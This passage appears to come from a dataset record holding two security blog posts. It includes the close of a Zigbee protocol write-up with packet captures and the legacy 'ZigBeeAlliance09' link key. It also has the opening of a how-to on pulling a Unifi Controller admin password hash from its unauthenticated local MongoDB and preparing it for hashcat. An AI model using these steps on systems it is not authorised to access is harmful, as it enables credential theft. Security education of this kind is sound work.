thus not able to receive any traffic sent to them in real-time. Periodically, they wake up and check for messages by querying their (parent) router (ZR) that they are logically connected to. Note: The router buffers the data intended for the ZED (child) and sends that data only when polled by the ZED on wake up. Wake-up times are defined by the application developer, NOT the Zigbee specification.\n\nZED's can immediately communicate with their (parent) router on wake up because ZR's are always awake.\n\nZigbee Stack\n\nPHYSICAL Layer\n\nThe Physical layer includes the interface of the physical radio and MAC layer, radio on/off control, modulation and demodulation, channel selection, link quality estimation, and energy detection. Zigbee radios share the 2.4 GHz ISM band with Wi-Fi and, using 16 channels (11-26), 2 MHz wide with 5 MHz carrier separation between channels.\n\nMAC Layer\n\nIn the MAC header, there is a 2-byte field \"Frame Control.\u201d Bit 0-2 indicating the frame type. Typically, there are four frame types:\n\nBeacon, used to scan networks\n\nData, used to transmit data from higher layers\n\nACK, acknowledgement\n\nMAC Command, control commands of MAC layer, like MAC association procedure.\n\nAt the end of each MAC frame, there are two bytes CRC used to verify the integrity of the packet.\n\nNETWORK Layer\n\nThe Network layer is located between the MAC layer and the application support sub-layer (APS) and is where the network management takes place. The Network layer takes care of the network structure, routing, and security. \n\nDevice Types\n\nIEEE-802.15.4 defines two network device types:\n\nFFD, Full Functional Device, capable of performing all the duties described in the IEEE 802.15.4 standard and can accept any role in the network.\n\nRFD, Reduced Functional Device (generally battery-powered), has limited capabilities.\n\n    Note: The processing power and memory size of RFD devices are normally less than those of FFD devices.\n\nIn Zigbee, there are three physical device types:\n\nCoordinator (forms the network, has routing capability, is powered by main, must always stay awake, can be a parent)\n\nThere can only be one coordinator per network. Coordinators node ID is always 0000.\n\nRouter (cannot form the network, has routing capability, is powered by main, must always stay awake, can be a parent)\n\nEnd Device (cannot form the network, does not have routing capability, is powered by main or battery, must have a parent)\n\nEnd device can be non-sleep end device or sleep end device. \n\nNetwork Address\n\nZigbee uses PAN ID and extended PAN ID to identify a network.\n\nPAN ID is a 16-bit identifier that all nodes in the PAN (Personal Area Network) will share. The PAN ID is chosen by the coordinator upon forming the network and is used to distinguish it from other nearby networks that may happen to be on the same channel.\n\nExtended PAN ID is a fallback network identifier known by all nodes in the PAN. The normal (short) PAN ID is transmitted in 'over the air' packets as it is quicker to send 16 bits versus 64 bits. The extended PAN ID is also unique for every PAN and is chosen by the coordinator upon forming the network. However, the extended PAN ID is seldom transmitted over the air and is used more as a backup criteria in case PAN ID conflicts were to arise. Using the extended PAN ID would allow the coordinator to talk to all nodes and establish a new PAN ID to move to and resolve the issue. The extended PAN ID is only sent over the air in response to an \"active scan\" (new nodes requesting to join the network) and when a rare PAN ID update is occurring.\n\nDevice (Node) Address\n\nLike the Network address, each node in the network has a unique short and long address to distinguish it from the other nodes in the network. \n\nThe long address is the 64-bit IEEE assigned MAC address (EUI-64) and is a globally unique ID (GUID) that is generally assigned during the manufacturing stage. Being a globally unique ID means that no two IEEE radios in the world will have the same GUID. As is the case with the extended Network address, the long (EUI-64) address is seldom sent over the air, except for join (Beacon) requests and/or to resolve rare node address conflicts.\n\nThe short address (16-bit), assigned by the coordinator when the node joins the network, is used over the air. Known as the Node ID, this address is unique to its home PAN network. \n\nAPPLICATION Layer\n\nThe ZigBee Application layer is called application framework (AF) and runs on top of the Application support layer (APS). The AF supports many applications and processes incoming data between registered applications. Some registered applications are defined within the Zigbee specification, while others are vendor implementations. Zigbee defines an application as a profile. ZigBee profiles are identified with an integer between 0 and 240, called an endpoint. There are two types of application profiles: public and vendor-specific. A special profile with an endpoint ID of zero is the ZDO (Zigbee device object) and it is used for network configuration and setup.\n\nThe Zigbee Alliance has defined a few profiles, such as Smart Energy, Home Automation, Commercial Building Automation, Toys, etc.\n\nDevice endpoints versus Logical endpoints\n\nA logical endpoint ID is an 8-bit value, ranging from 0 to 255.\n\nEndpoint 0 is reserved for Zigbee Device Object (ZDO), used for network management purposes.\n\nEndpoint 1 to 239 can be used by user applications.\n\nEndpoint 240 to 254 are reserved for special applications.\n\nEndpoint 255 is used for broadcasting.\n\nBroadcast Addresses\n\nApplications register with an endpoint identifier at the AF layer. When the AF layer processes an incoming message, it is passed on to the appropriate cluster for handling based on the endpoint identifier. If a packet arrives for an endpoint identifier that is not registered, the packet is silently dropped.\n\nEndpoints are logical extensions defined in the application layer that can be thought of as devices accessible through a single ZigBee radio node. For example, a light switch attached to a radio node might be one endpoint (physical), and a dimmer attached to the same node might be another endpoint (logical) rather than a completely new application (see figure 1). In another example, a smart outlet strip attached to a radio node might be an endpoint (physical), and each outlet on the strip attached to the same node might be other endpoints (see figure 2).\n\nCLUSTERS \n\nZigbee clusters are based on a client/server model and are used to implement an application protocol between two or more devices. Clusters are a group of commands and attributes that define what a device can do (a group of actions by function). Each cluster is assigned a cluster ID which is defined in the Zigbee Cluster Library (ZCL). A cluster may be defined with several attributes and commands.\n\nA cluster in the ZigBee Cluster Library is an object, containing both methods (commands) and data (attributes).\n\nBinding is an action in ZigBee which defines relations between two devices, specific endpoints, and cluster ID. It provides a mechanism for attaching an endpoint on one node to one or more endpoints on another node and can even be applied to groups of nodes.\n\nSECURITY\n\nSecurity within the Zigbee network is based on a network key and link keys. Unicast communication between any two application layer devices is secured using a 128-bit link key shared by the two devices, while broadcast communications are secured by a 128-bit network key shared among ALL devices in the network. The intended recipient(s) of the communication is always aware of the precise security arrangement; by that, the recipient knows whether the frame is protected with a link key or a network key.\n\nNETWORK Key\n\nZigbee network security uses a network-wide key for encryption and decryption. The network key is a 128-bit key shared by all devices in the network. Normally, it\u2019s randomly generated by the coordinator when the network is formed. When new devices join the network, they must get a copy of the network key.\n\nTRUST CENTER Networks\n\nIn a Zigbee network, the role of who distributes a network key to new devices is called the trust center (TC). There are two security models, centralized security network and distributed security network. \n\nIn a centralized security network, there is only one trust center, and it's the coordinator. All new devices will get the network key from the coordinator. \n\nIn a distributed security network (no coordinator device), each router is a trust center. New devices can get the network key from any router, as any router can authorize and authenticate new devices that wish to join.\n\nNote: The decision to use a Distributed Trust Center Network or a Trust Center Network is done at the time the network is formed. There is no way to change this decision after the network has been started.\n\nAll devices that are authorized to join the network have a copy of the key and use it to encrypt and decrypt all network messages. The network key also has a sequence number associated with it to identify a particular instance of the key. Occasionally, when the network key is updated, the sequence number is incremented to allow devices to identify which instance of the network key has been used to secure the packet data. The sequence number ranges from 0 to 255. When the sequence number reaches 255, it wraps back to 0. All devices that are part of a secured Zigbee network have a copy of the network key.\n\nAs the network key needs to be transported from one device to another, the key value needs to be encrypted during transport. This encryption is done in the application layer.\n\nNETWORK Layer Security\n\nPacket Security\n\nA packet secured at the network layer is composed of the following elements (see below).\n\nAuxiliary Security Header\n\nThe auxiliary header contains data about the security of the packet that a receiving node uses to correctly authenticate and decrypt the packet. This data includes the type of key used, the sequence number (if it is the network key), the IEEE (long) address of the device that secured the data, and the frame counter.\n\nAuthentication and Encryption\n\nZigbee uses a 128-bit symmetric key to encrypt all transmissions at the network layer. The network and auxiliary headers are sent in the clear but authenticated, while the network payload is authenticated and encrypted. AES-128 is used to create a hash of the entire network portion of the message (security header and payload), which is appended to the end of the message. \n\nThis hash is known as the Message Integrity Code (MIC) and is used to authenticate the message by ensuring it has not been modified. A receiving device hashes the message and verifies the calculated MIC against the value appended to the message. Alterations to the message invalidate the MIC and the receiving node will silently discard the message. Note: Zigbee presently uses a 4-byte MIC.\n\nMessage Integrity Code (MIC)\n\nThe nonce (see figure 3) used in the AES-CCM* encryption process is a 13-octet string constructed using the security control field, the frame counter, and the source address fields of the Zigbee security header. The size of the MIC can be 32 bits, 64 bits, or 128 bits (32 bits in the following example).\n\nThe following screenshot (see figure 4) shows the Zigbee Network Layer and Zigbee Security Header sections of a Broadcast packet sent by my Smart Plug #1:\n\nNetwork Security Frame Counter\n\nA frame counter is included in the auxiliary headers as a means of protecting against replay attacks. All devices have their own unique outgoing frame counter and they maintain a list of their neighbors\u2019 and children's frame counters. Every time a device sends a packet, it increments its outgoing frame counter. All normal network communication is required to have network security and a valid frame counter. The only exception is during joining when devices do not yet have the network key. In that case, a joining device's messages are relayed through its parent until it is fully joined and authenticated. Any other messages that are received without network layer security are silently discarded.\n\nA receiving device verifies that the frame counter of the sending device has increased from the last value that it saw. If it has not increased, the packet is silently discarded. If the receiving device is not the final destination, the packet is decrypted and modified to include the routing device's frame counter. The packet is then re-encrypted and sent along to the next hop (known as hop-by-hop security). \n\nThe frame counter is 32 bits and may not wrap to zero. The network key can be updated before the frame counter reaches its maximum value. When that occurs, the frame counter may be reset to zero if the local device\u2019s value is above 0x80000000.\n\nAPPLICATION SUPPORT LAYER (APS) SECURITY\n\nEnd-to-End Security\n\nAPS security is intended to provide a way to send messages securely within a Zigbee network such that no other device can decrypt the data except the source and destination. This is different from network security, which provides only hop-by-hop security. In that case, every device that is part of the network hears the packet being sent to its destination and decrypts it.\n\nAPS security uses a shared key (link key) that only the source and destination know about, thus providing end-to-end security. Both APS layer and network layer encryption can be used simultaneously to encrypt the contents of a message. In that case, the APS layer security is applied first, and then the network layer security.\n\nA packet secured at the APS layer is composed of the following elements (see below):\n\nLINK Keys\n\nAPS security uses a peer-to-peer key known as the link key. Both devices must have already established this key with one another before sending APS-secured data. There are two types of link keys: trust center link keys and application link keys.\n\nTrust Center Link Keys\n\nThe trust center link key is a special link key in which one of the partner devices is the trust center. The stack uses this key to send and receive APS command messages to and from the trust center. The application may also use this key to send APS-encrypted data messages. All devices in a Zigbee network must have link keys. In a Trust Center Network, the devices must have a Trust Center Link Key. In a Distributed Trust Center Network, this key is called a Distributed Trust Center Link Key.\n\nApplication Link Keys\n\nApplication link keys are shared keys that may be established between any two nodes in the network, where neither device is a trust center. They may be used to add additional security to messages being sent to or from the application running on a node. Devices can have a different application link key for each device with which they communicate.\n\nA device may preconfigure an application link key or request a link key between itself and another device. In the latter case, it issues a request to the trust center encrypted with its trust center link key. The trust center acts as a trusted third party to both devices, so they can securely establish communications with one another.\n\nUnencrypted APS Data \n\nAPS layer security operates independently of network layer security. It is required for certain security messages (APS commands) sent to and from the trust center by the Zigbee stack. Unlike network security, APS security for application messages is optional. \n\nInstall Codes\n\nAn installation code key is just a preconfigured trust center link key used to enter the Zigbee network and obtain the current network key. Because this unique key must be known to both the joining device and the trust center at the time of network entry, a piece of shareable data known as the \u201cinstall code\u201d is used to derive the key at both sides. As part of this process, the installation code and the joining device\u2019s EUI64 must be conveyed out-of-band to the network\u2019s trust center to allow the proper link key table entry to be created. \n\nThe code can be any arbitrary value of 6, 8, 12, or 16-bytes, followed by a 16-bit CRC (least significant byte first) over those bytes. This code is then used as the input to a Matyas-Meyer-Oseas (MMO) hash function with a digest size (hash length) equal to 128 bits. The 128-bit result of this AES-MMO hash function is used as the value for the preconfigured trust center link key for that device. The trust center can then install a key table entry with that key and the EUI64 of the joining device, which then allows the authentication to take place successfully during joining, and the joining device can successfully receive and decrypt the network key.\n\nIt should be noted that, as of Zigbee 3.0, all certified devices are required to have install codes, but use in the network is ultimately decided by the trust center. \n\nZIGBEE PACKET SNIFFING\n\nJoining a Network \n\nThe following Wireshark captured packets will demonstrate the process of how a new device joins a network. For this example, I created a Zigbee network using a coordinator (AduroSmart ERIA Smart Home Hub / Gateway) and a router device (Innr Zigbee Smart Plug).\n\nAssociation Request\n\nThe process of joining a network begins with the joining device sending a Beacon request command on all channels. Basically, the new device is asking, \"Is anybody out there?\" In the following frame (5), notice that the destination for this Beacon request is 0xffff, which we discovered earlier in this write-up to be a broadcast to all nodes in the area.\n\nIn response to Beacon requests, all Zigbee routers and coordinators in the area will respond with a Beacon response. Each router and coordinator on the channel will announce, \"Here I am!\" The Beacon response frame contains useful information about the responding node and the network it belongs to. \n\nIn the following frame (14), we can see the network PAN ID is 0x2999 and the source of this Beacon response is 0x0000, meaning this device is the coordinator for the Zigbee network PAN 0x2999. The Superframe Specification field verifies this as well, PAN Coordinator = True. Also notice that the Association Permit = True, meaning the coordinator is giving the joining device permission to join (be associated with this network).\n\nAdditionally, note that the Frame Control Field for beacons is 0x8000 and the Stack Profile, in this case, is 0x02 (Zigbee Pro).\n\nNow that a 'permission to join' has been granted, the next step is for the joining device to send an Association Request to the coordinator. \n\nWe can see this in the following frame (18). The Command Identifier of the Frame Control field is the 'Association Request' command (0x01) and the Source (joining device) is now displayed using its EUI-64 long address and the Destination is now a unicast message to the coordinator 0x0000. \n\nAs part of the Association Request, the joining device provides information about itself. Association Request = 0x8e indicates that the joining device (our Smart plug) is a full-function device (FFD), meaning that it can perform as a router. Power Source = AC/Mains Power indicates that it is not battery powered and will always be awake. \n\nAs a side note, if our joining device had been a battery-powered device, it could never be a router (parent to a child) and instead would function as a Zigbee End Device (ZED). In a Zigbee network, ZEDs will always be a child and will always be logically attached to its parent (router or coordinator).\n\nIn frame 20, we see the joining device issuing a Data Request command (0x04) to the coordinator 0x0000. The Data Request command is basically used by an end device (Smart Plug) to poll its parent (Coordinator) in order to receive data. In this case, the joining device is wanting confirmation that it is now part of the network (fully joined).\n\nNote: When capturing the 'Join' process on this sandboxed Zigbee network, I chose to run two Zigbee sniffers (the API-MOTE with Wireshark and the Texas Instruments CC2531 with PACKET-SNIFFER \u2014 SmartRF protocol packet sniffer) concurrently. The following screenshot shows the same information just presented, but as it was displayed with the Texas Instruments Packet Sniffer application.\n\nPacket 15 shows the joining device Beacon Request and packet 16 shows the coordinator's Beacon Response with the Association Permit bit set to True. (Notice that packet 17 was also captured, but is from a different (nearby) PAN (0x8848), so we can ignore that one.) \n\nContinuing sequentially, packet 18 shows the joining device (EUI-64 long address) Association Request command (sequence number 0xb2). Packet 19 is the Ack for sequence (0xb2). \n\nPacket 20 shows the joining device Data Request command, polling the coordinator for data (confirmation of join status). Notice that the joining device sequence counter incremented to 0xb3. Packet 21 is the Ack for sequence 0xb3. \n\nPacket 22 shows the coordinator (EUI-64 long address) Association Response, sending the requested data to the joining device (EUI-64 long address). The requested data in this case is the assignment of a new node ID (short address 0x2d24) to the joining device and an Association status of Successful. Packet 23 is the Ack for the Association Response.\n\nKeep in mind, this is just a confirmation that the joining device (0x2d24) has successfully joined the network (PAN 0x2999), but the device can not communicate with any of the other devices in the network until it is given the trust center's network key. In this case, we could say the newly joined device is associated, but not yet authenticated.\n\nNotice that the sequence number increments each time the coordinator communicates with the joining device and each time the joining device communicates with the coordinator. Also, notice that each has its own unique sequence number. This, in combination with unique device frame counters, helps protect the network from replay attacks.\n\nAUTHENTICATION (Getting the Network Key)\n\nWhen creating my sandboxed Zigbee network, I authenticated the smart plug device out-of-band (OOB) using my mobile phone and the AduroSmart ERIA Home Automation application. This implementation of joining the network uses Install codes (standard on all Smart Energy devices and all devices running Zigbee 3.0 or later). \n\nUsing an installation code provides security for the initial exchange of the network key to the device, at the cost of added interaction between the user and the trust center. A user must somehow transfer the key from the device to the trust center. This can be accomplished by a mechanism outside of the Zigbee network (OOB), such as typing the code into the trust center from a label on the device or scanning the associated QR code.\n\nDuring manufacturing, the Install code is placed in the memory of the device and also printed somewhere on the device (and/or outside packaging). An application within the device submits the Install code as an input to a Matyas-Meyer-Oseas (MMO) one-way compression function (https://en.wikipedia.org/wiki/One-way_compression_function), which outputs a 128-bit hash (pre-configured link key). \n\nThis Install code and the EUI-64 (extended) address of the joining device are provided OOB to the coordinator, who uses the same MMO function. Both endpoints can now produce the preconfigured link key used to encrypt and decrypt messages. The preconfigured link key is exclusive (private) to the newly joined device and the coordinator. The coordinator can now securely transport the secret network key (encrypted with the preconfigured link key). \n\nConsequently, even myself, as owner and administrator of this sample (sandboxed) Zigbee network, does not know the actual preconfigured link key. Although, I might be able to obtain it through trial and error (submitting what I believe is the Install code, as an input to the MMO algorithm). Unfortunately, I would still need to verify the authenticity of this key by decrypting a known encrypted payload and validating its plaintext result. Although this is something that I am still pursuing, it is presently beyond the scope of this write-up.\n\nNote: For a relatively short period of time, there existed a preconfigured global link key that was used to allow devices to associate (join) and authenticate to a network. At the time, the Zigbee Alliance felt that the extremely limited amount of over-the-air (OTA) exposure was acceptable, as a trade-off for ease of installation for the end consumer. The value '5A 69 67 42 65 65 41 6C 6C 69 61 6E 63 65 30 39' (Ascii representation of ZigBeeAlliance09) is no longer recognized as a valid global link key in Zigbee 3.0 and later, but still exists in many legacy stacks and devices.\n\nOnce the newly joined device receives the network key, all future sensitive communication with the network will be encrypted with this key.\n\nAdding Another Zigbee Device to Our Network\n\nCurrently, our Zigbee network has been formed using an ERIA Smart hub as the Zigbee Coordinator (ZC), and an Innr Smart Plug as a Zigbee End Device (ZED). Notice, that even though the Smart Plug is a (never sleeps) full-function device (FFD) and could be a router, it is actually considered a ZED (that never sleeps) until it becomes a parent.\n\nLet's add a battery-powered door/window sensor Zigbee device to our network. Check out the floor plan of our Zigbee network and pay particular attention to the placement of our devices. \n\nZigbee networks are self-forming and self-healing mesh networks. What this means is that when a new device joins the network, the (parent) router is chosen based upon relative distance, by determining the shortest route. This allows for more reliable communications (fewer dropped packets) and helps facilitate self-healing should a parent (ZR) fail or be moved to a different unrelated network. In this case, the next closest router (or coordinator) will become the new parent.\n\nIn a Zigbee mesh network, the Received Signal Strength Indicator (RSSI) and Language Quality Inspection (LQI) can be used to determine the relative distance between nodes. RSSI is a distance-based network parameter, which is a measurement of radio signal strength, while LQI is a metric of the link quality of the received signal. The (LQI) can be seen at the end of the Texas Instruments packets: \n\nThe Radius Field\n\nThe radius is a 1-byte value (Zigbee Network Layer) that is used as an indication of how far-reaching a signal is intended to go. For example, a radius of 1 is often useful in communicating to nodes that are in close proximity to each other. The network may be 10 hops in diameter, but if a broadcast is limited to a radius of 1, it will only affect its neighboring nodes. This feature becomes very handy in situations such as hotel rooms, commercial offices, hospital rooms, etc. where controlling various sensors, locks, or equipment specific to a room is needed.\n\nPreparing the sensor for pairing\n\nFor previously used sensors, we first need to factory reset the Door Sensor. This can be accomplished by removing the battery, holding down the tamper switch while reinserting the battery. Continue holding down the tamper switch until the LED lights (indicating the factory reset is starting). Immediately release the tamper switch within 4 seconds. The sensor should begin to flash the LED, indicating pairing mode is activated.\n\nNewly purchased devices typically have a plastic tab inserted between the battery and its contacts to prevent it from powering on until it's ready to be installed. Simply pull the plastic tab from the device, thereby allowing the battery to make contact and power the unit. Immediately upon power-up, the sensor should begin to flash the LED, indicating pairing mode is active.\n\nThe pairing mode window will remain open for a few minutes (up to 245 seconds), in which time we need to place the hub in pairing mode (typically, by pressing the power button for 1-2 seconds). If successful, the LED on the hub should begin to flash, indicating pairing mode active.\n\nSniffing Zigbee traffic\n\nAgain, I chose to run two sniffers concurrently, while capturing the join process of the Door Sensor Zigbee device. The following Texas Instruments CC2531 captured packets represent the joining process. Notice that it pretty much mirrors the Smart Plug pairing, with a few new key points.\n\nLike the Smart Plug, the Door Sensor begins with a Beacon Request (frame 338), asking for Beacon Responses from all devices in the network. \n\nAs was the case with the Smart Plug, a coordinator from a nearby (unrelated) network (PAN 0x8848) responds with its Beacon (frame 340) but as before, we can ignore this. \n\nSo, this leaves two remaining Beacons (frames 339 and 341), which are our coordinator (0x0000) and Smart Plug (0x2d24). In particular, notice that both devices are showing the Association permit bit True, meaning either device is capable of allowing the Sensor to join. Note: Reduced Function Device (RFD) endpoints do NOT issue Beacons.\n\nBased upon the relative proximity of all of the devices, the Smart Plug is chosen as the Sensor's potential parent, as it is much closer than the coordinator (see floor plan). \n\nFrame 342 shows the Sensor (source) sending an Association Request to the Smart Plug (destination). Because the Sensor is not yet associated with the network, it needs to use its EUI-64 address (0x000d6f000b3bb389). Frame 343 is the Ack for the Association Request (matching sequence number 0x36).\n\nFrame 344 shows the Sensor sending a Data Request to the Smart Plug (0x2d24), polling the Smart Plug for data (confirmation of join status). Frame 345 is the Ack for the Data Request command (sequence number 0x37).\n\nFrame 346 shows the Smart Plug's (EUI-64 long address) Association Response, sending the requested data to the Sensor's (EUI-64 long address). The requested data in this case is the assignment of a new node ID (short address 0x55BB) to the Sensor and an Association status of Successful. Frame 347 is the Ack for the Association Response.\n\nAt this point, the Smart Plug is no longer considered an end device (ZED). It is a now fully functioning router (ZR) and a parent to its child, the Sensor (ZED).\n\nOur sample Zigbee network now looks like this:\n\nAs was the case when the Smart Plug first joined the network, the Sensor has successfully joined the network (PAN 0x2999), but cannot communicate with any of the other devices in the network until it is given the trust center's network key. The Door Sensor (ZED) is associated, but not yet authenticated.\n\nAs we stated earlier (and often) in this write-up, the Coordinator is the trust center for all Zigbee Centralized Security networks. So all requests or commands of a sensitive nature must be made to the trust center, the coordinator (ZC). In order to accomplish this, the Door Sensor (ZED) must use its parent (ZR) to relay the Data Request to the (ZC).\n\nNotice that frame 350 shows the Sensor (source) sending the Data Request to its parent, the Smart Plug (ZR). Frame 351 is the Ack for the Data Request.\n\nFrame (352) shows the Smart Plug (source) forwarding a network payload to the (ZC). Frame 353 is the Ack for frame353.\n\nThe following Wireshark screenshot shows a Zigbee Network layer data frame (177), where the source is the Coordinator (ZC) and the intended destination is the Sensor (ZED), using the Smart Plug (ZR) as the relaying router. Notice 'Security: True'. This is a good example of the trust center (ZC) sending sensitive data to a child device (ZED), via the child's parent (ZR).\n\nTo complete this Zigbee project, we will commission two more Zigbee devices into the network: Innr Smart Plug #2 and Xfinity Door Sensor #2. Check out the modified floor plan of our Zigbee network, and again, pay particular attention to the placement of our devices. \n\nAs we can see, we have one coordinator (ZC) which is the trust center of the network. We have two routers (ZR) that function as smart plugs, and we have two end devices (ZED) that function as sensors. Also, we can see that Smart Plug-1 is the parent of Sensor-1, while the Coordinator is the parent to Sensor-2, Smart Plug-1, and Smart Plug-2.\n\nAlthough this arrangement of devices is fine for small home networks that are well within range of the coordinator, ideally it would be more beneficial to move the coordinator to the center of the network's target area. This becomes even more important when automating large commercial properties with hundreds of possible nodes.\n\nSummary\n\nThe undertaking of this project proved to be extremely exhaustive and required navigating to many sites to acquire the information necessary to produce this write-up. Occasionally, I would find that the material being presented was either outdated, incorrectly explained, or lacking the technical information necessary for an in-depth discussion of the Zigbee wireless protocol. \n\nHopefully, by weeding out much of the irrelevant or incorrect information and by deep-diving into a number of certified Zigbee specifications (Zigbee Alliance, Silicon Labs, Texas Instruments, etc.), the material presented in this write-up offers the reader a clear and concise understanding of how it all comes together. Keep in mind, variants in the Zigbee stacks (legacy or vendor related) do exist and always need to be considered (as with any evolving technology) when doing your own research or development.\n\nFor myself, some of the key takeaways I've learned from this project are that Zigbee offers a complete solution to home and commercial automation of the internet of things (IoT). In particular, Zigbee's mesh-networking offers ranges that can far exceed the 10-100 meter limitation for individual devices, by implementing a self-forming and self-healing network. Literally, thousands of devices can theoretically communicate on a mesh network at far-reaching distances, while still maintaining reliable, low-power communication between nodes. \n\nRemarkably, Zigbee's constantly evolving security infrastructure is in a league of its own. Its security architecture complements the security services provided by IEEE 802.15.4 standard. Zigbee's security is based on an open trust concept, where the protocol stack layers trust each other, and that the layer that originates a frame is responsible for initially securing it. The secret keys are not inadvertently revealed during key transport. Moreover, the introduction of Install Codes in Zigbee 3.0 (mandatory in previous SmartThings stacks) is a highly secure way to transport keys, where no key is ever transported in plaintext over-the-air (OTA). Additionally, Zigbee's use of individual device frame counters and sequence numbers, and the implementation of the Message Integrity Code (MIC) as a deterrent, ultimately make replay attacks highly unlikely. Add to this the realization that the coordinator (Trust Center) can change the Network key at any time that it feels the security of the network might be compromised, which makes for an extremely secure network.\n\nIn closing, it is my intent to continue my research of the constantly evolving Zigbee protocol. In particular, I intend on focusing much of my ongoing research pertinent to the recent implementation of Install Codes in Zigbee 3.0, as I feel that this is going to be the de facto standard going forward. Specifically, I'm very much interested in discovering the Install Code of one of my devices, submitting it as the input to a Matyas-Meyer-Oseas (MMO) hash function, and using the resultant 128-bit link key to decrypt the highly evasive encrypted Network key on my Zigbee network. This could very well be the groundwork for a follow-up blog, \"Inside Zigbee Security.\u201d Stay tuned.\n\nResearch and useful links\n\nhttps://csa-iot.org/\n\nhttps://zigbeealliance.org/\n\nhttps://zigbeealliance.org/solution/zigbee/\n\nhttps://zigbeealliance.org/news_and_articles/step-by-step-guide-getting-started-with-zigbee/\n\nhttps://community.silabs.com/s/?language=en_US\n\nhttps://docs.silabs.com/zigbee/6.6/em35x/group-ember\n\nhttps://www.silabs.com/developers/zigbee-emberznet\n\nhttps://www.silabs.com/developers/simplicity-studio\n\nhttps://news.silabs.com/2012-07-09-Silicon-Labs-Completes-Acquisition-of-Ember\n\nhttps://www.silabs.com/documents/public/user-guides/ug103-01-fundamentals-wireless-network.pdf\n\nhttps://www.silabs.com/documents/public/user-guides/ug103-02-fundamentals-zigbee.pdf\n\nhttps://www.silabs.com/documents/public/user-guides/ug103-03-fundamentals-design-choices.pdf\n\nhttps://www.silabs.com/documents/public/application-notes/an1233-zigbee-security.pdf\n\nhttps://github.com/SiliconLabs/IoT-Developer-Boot-Camp/wiki/Zigbee-Preparatory-Course\n\nhttps://www.silabs.com/support/training/mesh\n\nhttps://www.ti.com/tool/Z-STACK\n\nhttps://www.ti.com/tool/PACKET-SNIFFER\n\nhttps://en.wikipedia.org/wiki/Zigbee\n\nhttps://research.kudelskisecurity.com/2017/11/08/zigbee-security-basics-part-2/\n\nhttps://www.zigbee2mqtt.io/information/zigbee_network.html\n\nhttps://www.sciencedirect.com/topics/computer-science/zigbee-end-device\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Hacking Unifi Controller Passwords for Fun and WIFI\"\nTaxonomies: \"Author, How-To, Informational, Kent Ickler, Kent Ickler\"\nCreation Date: \"Thu, 21 Oct 2021 16:41:56 +0000\"\nKent Ickler //\n\nBecause, you know\u2014that should be a thing. \n\nTL;DR: \n\nDon\u2019t run the Unifi Controller on a laptop in the closet.   \n\nBACKGROUND \n\nUbiquiti\u2019s Unifi controller is a network device, or software service, that controls Ubiquiti\u2019s Unifi line of devices.  Unifi is a brand of devices that, well, unify together to make a better user experience for network users and system admins in the SMB arena.  We\u2019ll leave that up to your own opinion, but we\u2019ve used the devices and they work alright.   \n\nDISCLAIMER \n\nI\u2019m not here to comment on the controller\u2019s software design from a security perspective.  Ubiquiti pays security experts to do that.  That\u2019s not me or BHIS.  And that\u2019s OK. \n\n What I will tell you is this: \n\nA compromised Unifi Controller host is a compromised Unifi network. \n\nHACKERS GONNA HACK \n\nUnifi cloud-enabled devices got popped awhile back.  Thought I should mention it.   \n\nhttps://krebsonsecurity.com/2021/03/whistleblower-ubiquiti-breach-catastrophic/\n\nEnough of that. \n\nLOCAL CONTROLLER \n\nThe local Unifi Cloud Controller can be installed on a Linux or Windows system if you didn\u2019t want to buy their \u201cCloud Key\u201d hardware controller (https://store.ui.com/products/unifi-cloudkey).  It\u2019s awesome that they provide a downloadable controller to Unifi equipment owners.  This allows for a centralized install and administration of local Unifi devices without having to purchase an additional piece of software or hardware. \n\nDownload link: https://www.ui.com/download/unifi/ \n\nIn fact, it\u2019s so awesome and versatile, it\u2019s like they want us to install it on an old random laptop that we don\u2019t actively use and will completely forget is running. \n\nCONTROLLER DESIGN \n\nThe back-end database for the controller is running a MongoDB database.  While the database server only listens to the loopback address of the host it is installed on, it doesn\u2019t require authentication.   \n\nAgain, I\u2019m not commenting on that. \n\nLOOPBACK PORT FORWARDING \n\nThose in infosec know that loopback addresses are only as secure as the system that operates them.  In the grand scheme of things, if the host running the controller is compromised, it would be trivial to get remote access to the Unifi Controller using the loopback address without having remote desktop or console access.  For demonstration purposes, I\u2019m jumping straight to the host via RDP to snag some easy screenshots.   \n\nNO SQL \n\nI\u2019d normally use DBeaver (https://dbeaver.io/) for this type of thing.  A while back, DBeaver removed their No-SQL and MongoDB drivers from the Community Version.  Bummer.   \n\nNOSQLBooster (https://nosqlbooster.com/) is a stand-in replacement that works great.   \n\nAfter starting NOSQLBooster, you\u2019ll need to connect to the local database.   \n\nDRAKE MONGODB PORT HOTLINE \n\nNo MongoDB here. \n\nEven without Drake, this loopback obfuscated port wouldn\u2019t have been hard to find with some cmd-fu.  \n\nBut\u2026 Ubiquiti was kind enough to fully document it too: https://help.ui.com/hc/en-us/articles/218506997-UniFi-Ports-Used \n\nGET CONNECTED \n\nIn NOSQLBooster, click on \u201cConnect\u201d followed by \u201cCreate.\u201d  Enter the details: \n\nType: Single Server  \n\nServer: localhost  \n\nPort: 27117  \n\nName: Unifi     \n\nNext, press \u201cSave and Connect.\u201d \n\nThe database structure will open on the left side of the application. \n\nTHE GOOD HACKERY STUFF \n\nLet\u2019s drill down to Unifi > ace > admin.   \n\nDouble click \u201cadmin\u201d to open the associated records.   \n\nNotice the x_shadow key?  It looks awfully like a hashed password.  \n\nSpoiler: It is. \n\nLet\u2019s snag that key and do some magic. \n\nSTOP, HASHER TIME \n\nDance to this and you\u2019re gonna get thinner. \n\n$6$KPCNpIC/$GzO92iNqVVQNN8cQonvDQumnwmYOnUzvC6WvGLLMcysBfporCeVt7UYgGKPnkxp8B/e0Ckp.57Q8UiWw32sM60 \n\nLet\u2019s dissect that hash.  By analyzing the hash with the modular-crypt-format (https://passlib.readthedocs.io/en/stable/modular_crypt_format.html), we can identify its individual parts.  That syntax for this type of hash: $id$salt$encrypted \n\nFirst, the id, $6$, tells us we are looking at some sort of variation of SHA512-crypt. \n\nThe text between the $6$ and the next $ is the hash salt (KPCNpIC/).  There are some amusing bits about that salt we\u2019ll discuss later.   \n\nAfter the salt and $ is the cryptographic hash of the password+salt (GzO92iNqVVQNN8cQonvDQumnwmYOnUzvC6WvGLLMcysBfporCeVt7UYgGKPnkxp8B/e0Ckp.57Q8UiWw32sM60). \n\nI SMELL PENGUIN \n\nNotably, this is a common hash type in Linux shadow files.  Cleverly, we found the hash in a key named x_shadow.   \n\nThose of you that know Linux already identified the hash as a salted sha512crypt hash. \n\nHashcat nerds (like me) already know that this is mode 1800.  \n\nCRACK HASH, GET POT \n\nGet on with it.  \n\nFirst, we throw that 